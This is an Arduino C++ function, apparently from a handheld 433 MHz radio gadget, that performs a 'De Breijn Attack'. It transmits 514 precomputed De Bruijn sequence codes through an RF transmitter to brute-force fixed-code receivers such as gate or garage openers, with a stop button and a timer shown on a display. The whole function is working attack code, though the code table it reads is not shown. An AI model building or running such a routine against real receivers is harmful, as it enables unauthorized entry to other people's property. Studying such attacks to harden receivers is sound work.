void deBruijn(void) {
  long dbTimer = millis();
  display.clear();
  display.setCursor(0,0);
  display.print(F("De Breijn Attack"));
  display.setCursor(98,7);
  display.print(F("Stop"));
  int protocol = 1;
  int bitlength = 32;
  mhz433t.setProtocol(protocol);
  display.setCursor(41,3);
  display.print(F("Transmitting..."));
  //Stop repeats
  mhz433t.setRepeatTransmit(1);
  //Warm up
  for (int i = 0; i < 5; i++){
    mhz433t.send(1111,bitlength);
  }
  for (int i = 0; i < 514; i++){
    mhz433t.send(pgm_read_dword_near(dB + i),bitlength);
    //Dummy transmission below
    //delay(6);
    selReading = digitalRead(selButton);
    if (selReading != lastSelButtonState) {
      lastSelDebounceTime = millis();
      } 
      if ((millis() - lastSelDebounceTime) > debounceDelay) { 
        if (selReading != selButtonState) {
          selButtonState = selReading;
          if (!selButtonState) {
            display.setCursor(45,7);
            display.print(F("Stopped        "));
            delay(2000);
            display.clear();
             //Restore repeats
             mhz433t.setRepeatTransmit(10);
            return;
          }
        }
      }
      lastSelButtonState = selReading;
  }
  
  //Restore repeats
  mhz433t.setRepeatTransmit(10);
  
  display.setCursor(41,3);
  display.print(F("           "));
  display.setCursor(80,7);
  display.print(F("        "));
  display.setCursor(41,3);
  display.print(F("Complete       "));
  display.setCursor(0,5);
  display.print(("Time: "));
  float timeTaken = ((float)(millis()-(float)dbTimer) / 1000);
  display.print(timeTaken);
  display.print(F(" seconds"));
  delay(5000);
  display.clear();
}
